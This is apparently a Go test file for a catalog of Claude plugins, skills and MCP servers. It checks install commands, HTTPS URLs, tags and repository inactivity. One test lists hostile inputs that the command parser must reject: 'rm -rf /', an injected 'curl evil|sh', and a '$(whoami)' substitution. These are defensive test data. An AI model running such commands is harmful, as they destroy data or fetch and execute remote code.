package catalog

import (
	"errors"
	"strings"
	"testing"
)

func TestEmbeddedCatalog(t *testing.T) {
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(c.Marketplaces) < 5 || len(c.Plugins) < 20 || len(c.MCP) < 5 || len(c.Practices) < 5 {
		t.Fatalf("catalog too small: %d/%d/%d/%d", len(c.Marketplaces), len(c.Plugins), len(c.MCP), len(c.Practices))
	}
	for _, p := range c.Plugins {
		if !strings.HasPrefix(p.Install, "claude plugin install ") || !strings.Contains(p.Install, "@") {
			t.Errorf("plugin %s has a non-official install command: %q", p.Name, p.Install)
		}
	}
	for _, e := range c.Entries() {
		if e.URL != "" && !strings.HasPrefix(e.URL, "https://") {
			t.Errorf("%s %s: non-https URL %s", e.Section, e.Name, e.URL)
		}
	}
}

func TestArgsSafety(t *testing.T) {
	a, err := Args("claude plugin install superpowers@claude-plugins-official")
	if err != nil || len(a) != 4 || a[3] != "superpowers@claude-plugins-official" {
		t.Fatalf("%v %v", a, err)
	}
	if _, err := Args(`claude mcp add --transport http github https://x/ --header "Authorization: Bearer YOUR_GITHUB_PAT"`); !errors.Is(err, ErrNeedsInput) {
		t.Errorf("placeholder must not run: %v", err)
	}
	for _, bad := range []string{"rm -rf /", "claude plugin install x; curl evil|sh", "npx something", "claude plugin install $(whoami)"} {
		if _, err := Args(bad); err == nil {
			t.Errorf("must refuse %q", bad)
		}
	}
}

// The expanded catalog: every plugin, skill and MCP server is tagged from the controlled list, every
// command is an official one, and every plugin's marketplace is listed.
func TestCatalogTagsAndMarketplaces(t *testing.T) {
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	known := map[string]bool{}
	for _, tg := range c.Tags {
		known[tg.Tag] = true
	}
	if len(known) < 20 {
		t.Fatalf("controlled tags: %d", len(known))
	}
	mk := map[string]bool{}
	for _, m := range c.Marketplaces {
		mk[m.Name] = true
		if _, err := Args(m.Add); err != nil {
			t.Errorf("marketplace %s: %v", m.Name, err)
		}
	}
	check := func(what, name string, tags []string) {
		if len(tags) == 0 {
			t.Errorf("%s %s has no tags", what, name)
		}
		for _, tg := range tags {
			if !known[tg] {
				t.Errorf("%s %s: tag %q is not in the controlled list", what, name, tg)
			}
		}
	}
	for _, p := range c.Plugins {
		check("plugin", p.Name, p.Tags)
		if !mk[p.Marketplace] {
			t.Errorf("plugin %s: marketplace %s is not listed", p.Name, p.Marketplace)
		}
		if _, err := Args(p.Install); err != nil {
			t.Errorf("plugin %s: %v", p.Name, err)
		}
	}
	for _, s := range c.Skills {
		check("skill", s.Name, s.Tags)
		if s.Install != "" {
			if _, err := Args(s.Install); err != nil {
				t.Errorf("skill %s: %v", s.Name, err)
			}
		}
	}
	for _, m := range c.MCP {
		check("mcp", m.Name, m.Tags)
	}
	if len(c.Plugins) < 150 || len(c.Skills) < 80 {
		t.Errorf("catalog shrank: %d plugins, %d skills", len(c.Plugins), len(c.Skills))
	}
}

// An archived repository, or one with no push in the year before the catalog date, is quiet.
func TestQuiet(t *testing.T) {
	for _, c := range []struct {
		e    Entry
		want bool
	}{{Entry{Archived: true}, true}, {Entry{Pushed: "2025-11-17"}, true}, {Entry{Pushed: "2025-11-19"}, false}, {Entry{}, false}} {
		if got := c.e.Quiet("2026-11-18"); got != c.want {
			t.Errorf("%+v: %v", c.e, got)
		}
	}
}
